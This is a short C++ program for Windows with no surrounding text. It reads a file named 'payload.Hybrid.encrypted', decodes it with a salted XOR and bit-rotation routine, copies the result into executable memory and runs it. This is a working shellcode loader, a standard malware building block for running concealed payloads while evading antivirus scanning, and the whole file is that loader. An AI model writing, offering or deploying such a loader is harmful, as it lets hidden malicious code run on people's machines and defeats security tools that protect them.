#include <windows.h>
#include <fstream>
#include <vector>
#include <iostream>

static void run(const std::vector<unsigned char>& data) {
    auto exec = VirtualAlloc(nullptr, data.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec) return;
    memcpy(exec, data.data(), data.size());
    ((void(*)())exec)();
}

static std::vector<unsigned char> decryptHybrid(const std::vector<unsigned char>& enc) {
    if (enc.empty()) return {};
    unsigned char salt = enc[0];
    std::vector<unsigned char> out(enc.begin() + 1, enc.end());
    for (size_t i = 0; i < out.size(); ++i) {
        out[i] ^= static_cast<unsigned char>(i & 0xFF);
        out[i] = (out[i] >> 1) | (out[i] << 7);
        out[i] ^= salt;
    }
    return out;
}

int main() {
    std::ifstream f("payload.Hybrid.encrypted", std::ios::binary);
    std::vector<unsigned char> enc((std::istreambuf_iterator<char>(f)),
                                   std::istreambuf_iterator<char>());
    auto dec = decryptHybrid(enc);
    if (!dec.empty()) run(dec);
    return 0;
}
